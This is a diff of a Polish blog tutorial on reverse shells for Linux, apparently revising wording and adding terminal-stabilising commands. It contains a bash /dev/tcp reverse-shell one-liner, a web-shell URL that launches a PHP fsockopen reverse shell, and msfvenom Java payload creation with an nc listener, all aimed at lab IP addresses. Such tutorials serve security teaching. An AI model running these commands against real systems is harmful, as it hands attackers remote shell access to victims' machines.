@@ -6,14 +6,14 @@ categories:
   - Hacking
 tags:
   - Hacking
-  - reverse shell
+  - Reverse Shell
   - tools
 header:
   overlay_image: /assets/images/pasek-hack.png
 ---
 
 # Co to takiego jest i do czego służy Reverse Shell?
-**Reverse shell** (czyli odwrócone połączenie powłoki) to technika często wykorzystywana w dziedzinie cyberbezpieczeństwa. Polega ona na ustanowieniu połączenia zdalnego z systemem komputerowym i zdalnym uruchomieniu powłoki (w wypadku **Linuxa** Sh/Bash). W tradycyjnym połączeniu zdalnym, atakujący nawiązuje połączenie z ofiarą. Natomiast w przypadku reverse shell, to ofiara nawiązuje połączenie z atakującym. Zajmiemy się głównie **Reverse Shellem**.
+**Reverse shell** (czyli odwrócone połączenie powłoki) to technika często wykorzystywana w dziedzinie cyberbezpieczeństwa. Polega ona na ustanowieniu połączenia zdalnego z systemem komputerowym i zdalnym uruchomieniu powłoki (w wypadku **Linuxa** Sh/Bash). W tradycyjnym połączeniu zdalnym, atakujący nawiązuje połączenie z ofiarą. Natomiast w przypadku **Reverse Shell**, to ofiara nawiązuje połączenie z atakującym. Zajmiemy się głównie **Reverse Shellem**.
 {: .text-justify}
 # Jakich programów do tego potrzebuje?
 Zajmiemy się tutaj Linuxem. Opisze programy na ten system, chociaż na **Windowsa** też jest do tego program o nazwie **Nc**. Niestety wersji **Nc** na **Linuxa** jest dosyć dużo i mogą wprowadzić pewne zamieszanie:
@@ -267,7 +267,7 @@ Polecam ten drugi sposób z uruchomieniem programu **Script**
 ```bash
 [root@rocky8-test1 ~]# ^[[D^[[D^[[D^[[D
 ```
-Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Jednak od razu wspomnę, że nie za dobrze to działa, kiedy **puszczamy Shella** przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_. Jednak z **Nc** działa prawie, że idealnie. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
+Po wejściu na konsolę, podczas ruszania strzałkami są **krzaki**. również po naciśnięciu **ctrl+c** wychodzi się z konsoli. Jest jednak na to rada. Jednak od razu wspomnę, że nie za dobrze to działa, kiedy uruchamiamy komendę przez _bash -i &> /dev/tcp/172.16.1.89/1337 0>&1_. Jednak z **Nc** działa prawie, że idealnie. Więc kiedy jesteśmy już w konsoli wciskamy **ctrl+z** (zadanie w tle)
 {: .text-justify}
 ```bash
 [root@rocky8-test1 ~]# ^Z      
@@ -283,6 +283,13 @@ Teraz można dowolnie sterować strzałkami (_ctrl+c_ nie zamyka konsoli):
 {: .text-justify}
 ```bash
 [root@rocky8-test1 ~]# ^C ^C
+```
+Aby **polepszyć** wygląd i wczytać zmienne można dopisać:
+```bash
+export TERM=xterm-256color
+export SHELL=bash
+stty rows 44 columns 185
+source /etc/skel/.bashrc
 ```
 # Wyszedłem z konsoli, ale nic nie mogę napisać
 Spoko, wystarczy że wpiszesz:
@@ -354,8 +361,8 @@ http://172.16.1.123/uploads/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2
 ```
 Jezeli wszystko przebiegło poprawnie powinniśmy mieć dostęp do **Shella**.
 {: .text-justify}
-# Payloady
-Reverse Shell możemy tworzyć ręcznie, ale bardzo dobrze się nadaje do tego celu polecenie _msvenom_ ze wspomnianego wcześniej **Metasploita**. Tym razem będzie przykład reverse Shell uruchomionego przez Javę. Stworzyć ładunek można poleceniem:
+# Inne payloady
+Tworzenie **Reverse Shella** można przeprowadzać ręcznie, ale efektywnym podejściem jest skorzystanie z polecenia _msfvenom_, dostępnego w ramach wspomnianego wcześniej **Metasploita**. Poniżej przedstawiam przykład uruchomienia **Reverse Shella** poprzez **Javę**. Aby stworzyć odpowiedni payload, skorzystaj z poniższego polecenia:
 {: .text-justify}
 ## Metasploit
 ### Tworzenie ładunku
@@ -377,12 +384,12 @@ msfvenom -p java/shell_reverse_tcp LPORT=1337 -f jar -o shell.jar
 ```bash
 nc -lvn -p 1337
 ```
-Odpalamy ładunek na przejętym koncie poleceniem, Tu już nie jest ważny **listener**:
+Odpalamy ładunek na przejętym koncie poniższym poleceniem (Tu już nie jest ważny **listener**):
 {: .text-justify}
 ```bash
 /usr/bin/java -jar shell.jar
 ```
-Trochę jest zmylający parametr **LHOST**, bo to nie jest do końca _localhost_, ale w tym przypadku adres gdzie łączy się nasz ładunek.
+Trochę jest zmylający parametr **LHOST**, bo to nie jest do końca _localhost_, ale w tym przypadku jest to adres gdzie łączy się nasz ładunek.
 {: .text-justify}
 # Koniec
 I to już koniec. Mam nadzieję, że wyjaśniłem trochę sprawę. Na koniec bonus w postaci [linka](https://www.revshells.com/) do generatora **Shelli**. Jeżeli masz coś ciekawego do dodania, lub znalazłeś poważny błąd, daj znać.
